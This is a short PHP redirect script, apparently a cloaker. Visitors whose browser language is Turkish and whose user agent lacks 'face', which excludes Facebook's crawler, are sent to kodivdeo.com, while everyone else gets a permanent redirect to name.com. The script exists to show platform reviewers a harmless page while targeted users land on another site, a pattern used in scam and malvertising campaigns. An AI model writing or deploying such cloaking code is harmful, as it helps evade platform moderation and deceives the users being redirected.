<?php

$ip_adres = $_SERVER['HTTP_USER_AGENT']; 
$langs = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2);

$sonuc = strpos($ip_adres,"face");
if (($langs=='tr') && ($sonuc === false))
    {
header("Location: http://kodivdeo.com/");
    }
else {
header("HTTP/1.1 301 Moved Permanently");
header("Location: https://www.name.com/");
die(); exit();
}

 
 ?>
